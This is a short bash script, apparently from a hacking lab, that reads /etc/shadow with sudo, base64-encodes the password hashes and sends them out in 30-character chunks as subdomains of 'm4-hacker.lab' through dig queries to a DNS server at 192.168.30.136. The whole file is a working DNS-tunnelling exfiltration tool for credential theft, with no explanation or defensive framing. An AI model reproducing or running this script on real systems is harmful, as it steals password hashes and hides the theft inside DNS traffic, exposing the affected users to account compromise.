#!/bin/bash
FILE_PATH="/etc/shadow"
DOMAIN="m4-hacker.lab"
DNS_SERVER="192.168.30.136"
FILE_PATH="/etc/shadow"
CHUNK_SIZE=30

if [ ! -f "$FILE_PATH" ]; then

    exit 1
fi

DATA=$(sudo cat "$FILE_PATH")

ENCODED=$(echo -n "$DATA" | base64 -w 0)

LENGTH=${#ENCODED}
COUNT=$(( (LENGTH + CHUNK_SIZE - 1) / CHUNK_SIZE ))

for ((i=0; i < LENGTH; i+=CHUNK_SIZE)); do
    CHUNK=${ENCODED:i:CHUNK_SIZE}
    SUB="${CHUNK}.${DOMAIN}"

    # Send DNS request
    dig @"$DNS_SERVER" "$SUB" A +short >/dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "[+] Sent: $SUB"
    else
        echo "[-] Failed: $SUB"
    fi
done

